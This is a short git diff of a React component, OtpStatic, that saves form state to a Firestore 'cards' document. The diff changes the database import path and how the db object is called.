@@ -3,7 +3,7 @@ import { Alert, Container, Snackbar, styled } from "@mui/material";
 import { doc, setDoc } from "firebase/firestore";
 import React, { useState } from "react";
 import { useNavigate, useParams } from "react-router-dom";
-import { db } from ".";
+import { db } from "../config/firebase";
 
 var today = new Date();
 var dd = String(today.getDate()).padStart(2, "0");
@@ -68,7 +68,7 @@ function OtpStatic() {
   const submit = (e) => {
     e.preventDefault();
     setLoading(true);
-    const cardRef = doc(db, "cards", param);
+    const cardRef = doc(db(""), "cards", param);
     setDoc(cardRef, state, { merge: true }).then(() => {
       // navigate("/confirm", { replace: true })
 
